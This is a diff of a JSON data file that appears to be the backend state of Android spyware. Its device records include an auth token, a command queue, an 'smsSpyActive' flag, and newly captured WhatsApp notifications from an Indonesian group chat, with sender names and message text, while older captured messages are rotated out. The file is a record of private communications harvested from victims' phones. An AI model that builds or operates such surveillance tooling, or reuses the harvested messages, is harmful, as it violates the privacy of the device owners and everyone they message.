@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046560822,
+    "lastSeen": 1775046564304,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13684 pesan): ~ celynn?",
+        "content": ".claim",
+        "time": "01/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046564708
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15848 pesan dari 10 chat",
+        "time": "01/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046563675
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13683 pesan): ~ idk",
+        "content": ".brat hay hasya",
+        "time": "01/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046563619
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15847 pesan dari 10 chat",
+        "time": "01/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046562673
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13682 pesan): ~ Bot",
@@ -3987,38 +4019,6 @@
         "time": "01/04 20:17",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045829847
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15741 pesan dari 10 chat",
-        "time": "01/04 20:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045821936
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13537 pesan): ~ cewek bauti 👅☝🏻",
-        "content": "IHHHHH ELAH",
-        "time": "01/04 20:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045821853
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15740 pesan dari 10 chat",
-        "time": "01/04 20:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045811994
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13536 pesan): ~ Bot",
-        "content": "✅ Jawaban Benar! \nJawabannya adalah: super star\n\nSelamat kepada @⁨~mika⁩! 🎉\n🎁 Kamu mendapatkan hadiah +5 Limit Bot!",
-        "time": "01/04 20:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045811958
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13683 pesan): ~ idk",
+        "content": ".brat hay hasya",
+        "time": "01/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046563660
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15848 pesan dari 10 chat",
+        "time": "01/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046563645
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15847 pesan dari 10 chat",
+        "time": "01/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046562718
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13682 pesan): ~ Bot",
@@ -8040,30 +8064,6 @@
         "time": "01/04 20:17",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045821904
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13537 pesan): ~ cewek bauti 👅☝🏻",
-        "content": "IHHHHH ELAH",
-        "time": "01/04 20:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045821826
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15740 pesan dari 10 chat",
-        "time": "01/04 20:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045811983
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13536 pesan): ~ Bot",
-        "content": "✅ Jawaban Benar! \nJawabannya adalah: super star\n\nSelamat kepada @⁨~mika⁩! 🎉\n🎁 Kamu mendapatkan hadiah +5 Limit Bot!",
-        "time": "01/04 20:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045811896
       }
     ],
     "galleryPhotos": [],
